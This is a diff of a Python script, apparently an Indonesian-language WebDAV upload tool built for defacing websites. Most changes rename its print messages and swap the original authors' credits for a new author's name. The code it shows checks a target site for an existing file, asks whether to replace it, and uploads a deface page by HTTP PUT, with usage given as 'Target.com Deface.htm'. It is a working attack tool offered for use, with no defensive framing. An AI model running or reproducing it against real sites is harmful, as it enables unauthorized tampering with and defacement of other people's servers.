@@ -27,7 +27,7 @@ def webdav():
   nama = '/'+sys.argv[2]
 
 
-  print("[*] Upload File Nama : %s") % (sys.argv[2])
+  print("[*] Upload Deface : %s") % (sys.argv[2])
   print("[*] Uploading %d bytes, Script Baru") % len(script)
 
   r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})
@@ -37,19 +37,19 @@ def webdav():
     sys.exit(1)
   else:
     print("[+] File uploaded . . .")
-    print("[+] PATH : "+host + nama)
+    print("[+] Vuln Cuks : "+host + nama)
 
 
 def cekfile():
  print("""
-[*] WebDAV File Upload Exploiter
-[*] Coded To Python By AndroSec1337 Cyber Team
-[*] Thx To Tu5b0l3d IndoXploit For PHP Exploit
+[*] File Upload Exploit Webdav
+[*] Author : Boychongzen aka Xroot
+[*] Github : https://github.com/boychongzen18
 """)
- print("[*] Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
+ print("[*] Cek Website Target : "+sys.argv[1]+"/"+sys.argv[2])
  r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
  if r.status_code == requests.codes.ok:
-  print("[*] Di Temukan File Yg Sama Di Target . . .")
+  print("[*] File Target Sama Cuks. . .")
   tanya = raw_input("[!] Replace File Target ? [Y/N] > ")
   if tanya == "Y":
    webdav()
@@ -57,14 +57,14 @@ def cekfile():
    print("[!] Exiting Tools . . .")
    sys.exit()
  else:
-   print("[*] File Ga Di Target . . .")
-   print("[*] Proses Upload Script lu . . .")
+   print("[*] Target Proses Cuks. . .")
+   print("[*] Proses Upload Script Deface Lagi . . .")
    webdav()
 
 
 if __name__ == '__main__':
   if len(sys.argv) != 3:
-    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
+    print("\n[*] Usage: "+sys.argv[0]+" Target.com Deface.htm\n")
     sys.exit(0)
   else:
     cekfile()
